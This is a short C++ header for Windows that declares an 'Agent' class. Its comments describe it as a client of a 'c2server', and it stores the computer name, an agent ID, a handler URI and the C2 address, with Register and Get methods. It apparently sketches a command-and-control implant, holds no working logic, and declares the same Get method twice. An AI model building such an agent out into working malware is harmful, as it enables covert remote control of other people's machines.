#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <Windows.h>



class Agent {

protected:
	// command handler.
	std::string HandlerURI;
	std::string ComputerName;
	std::string AgentID; // MD5 of computername or something
	std::string ipAddress;
	unsigned int port;
	
	void Register();


public:
	// ip/port for c2server
	Agent(std::string ip, unsigned int port);
	std::string Get(std::string path);
	std::string Get(std::string path);

};